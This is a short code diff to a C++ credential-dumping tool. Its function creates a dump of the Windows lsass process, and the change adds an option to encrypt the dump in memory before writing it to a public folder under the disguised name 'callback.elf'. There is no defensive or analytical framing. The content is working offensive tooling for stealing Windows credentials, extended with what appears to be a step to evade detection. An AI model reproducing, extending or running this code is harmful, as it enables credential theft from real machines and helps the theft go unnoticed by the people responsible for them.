@@ -12,7 +12,7 @@ using namespace std;
 
 
 
-bool callbacksMDWD()
+bool callbacksMDWD(bool encrypt = false)
 {
 	int returnCode;
 	HANDLE dumpFile = NULL;
@@ -52,6 +52,16 @@ bool callbacksMDWD()
 	}
 
 	printf("Successfully created dump of lsass process.\n");
+
+	if (encrypt) {
+		// Encryption logic here
+		std::cout << "Encrypting the dump data before writing on disk.\n";
+		Encrypt(dBuff, bReadd);
+	}
+	else {
+		std::cout << "Proceeding without encryption..." << std::endl;
+	}
+	
 
 	std::string dumpFileName = "C:\\Users\\Public\\callback.elf";
 
